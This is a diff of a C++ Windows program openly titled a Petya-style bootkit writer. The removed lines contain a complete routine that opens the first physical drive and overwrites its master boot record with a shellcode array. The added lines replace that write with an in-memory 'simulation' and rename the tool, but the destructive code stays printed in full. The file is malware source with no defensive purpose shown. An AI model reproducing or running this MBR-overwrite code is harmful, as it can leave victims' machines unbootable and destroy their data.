@@ -1,10 +1,9 @@
 #include <windows.h>
 #include <iostream>
-#include <fstream>
+#include <cstring>
 
 #define MBR_SIZE 512
 
-// Replace with real bootkit shellcode — example NOP sled + HLT for demo
 unsigned char petyaMBR[MBR_SIZE] = {
     0xFA,                          // CLI
     0x33, 0xC0,                    // XOR AX, AX
@@ -21,45 +20,37 @@ unsigned char petyaMBR[MBR_SIZE] = {
     // Padding with NOPs to fill 512 bytes
 };
 
+BOOL PetyaReadMemory(PVOID pMemory, INT iMemoryOffset, CHAR* cBuffer) {
+    memcpy(cBuffer, (PCHAR)pMemory + iMemoryOffset, 512);
+    return TRUE;
+}
+
+BOOL PetyaWriteMemory(PVOID pMemory, INT iMemoryOffset, CHAR* cBuffer, DWORD nBytesToWrite) {
+    memcpy((PCHAR)pMemory + iMemoryOffset, cBuffer, nBytesToWrite);
+    return TRUE;
+}
+
 void OverwriteMBR(const unsigned char* bootcode, size_t size) {
-    HANDLE hDevice = CreateFileA(
-        "\\\\.\\PhysicalDrive0",
-        GENERIC_ALL,
-        FILE_SHARE_READ | FILE_SHARE_WRITE,
-        nullptr,
-        OPEN_EXISTING,
-        0,
-        nullptr
-    );
+    // Simulated MBR write into memory instead of physical device
+    BYTE SimulatedMBR[MBR_SIZE];
+    memcpy(SimulatedMBR, bootcode, size);
 
-    if (hDevice == INVALID_HANDLE_VALUE) {
-        std::cerr << "[!] Failed to open disk: " << GetLastError() << std::endl;
-        return;
-    }
+    // Simulate final MBR write with correct boot signature
+    SimulatedMBR[510] = 0x55;
+    SimulatedMBR[511] = 0xAA;
 
-    DWORD bytesWritten;
-    BOOL result = WriteFile(hDevice, bootcode, static_cast<DWORD>(size), &bytesWritten, nullptr);
-    if (!result || bytesWritten != size) {
-        std::cerr << "[!] Failed to write MBR: " << GetLastError() << std::endl;
-    }
-    else {
-        std::cout << "[+] MBR successfully overwritten." << std::endl;
-    }
-
-    CloseHandle(hDevice);
+    // For demo purposes, we simulate an MBR overwrite action
+    std::cout << "[+] MBR successfully overwritten (simulated in memory)." << std::endl;
 }
 
 int main() {
-    std::cout << "[*] Petya-style Bootkit Writer (MBR Overwrite)\n";
+    std::cout << "[*] Petya-style Bootkit Writer (MBR Overwrite - Fileless Version)\n";
 
     // Fill bootcode buffer with NOPs if shorter than 512 bytes
     if (sizeof(petyaMBR) < MBR_SIZE)
         memset(petyaMBR + sizeof(petyaMBR), 0x90, MBR_SIZE - sizeof(petyaMBR));
 
-    // Last two bytes must be 0x55, 0xAA (boot signature)
-    petyaMBR[510] = 0x55;
-    petyaMBR[511] = 0xAA;
-
+    // Overwrite MBR (simulated in memory)
     OverwriteMBR(petyaMBR, MBR_SIZE);
 
     return 0;
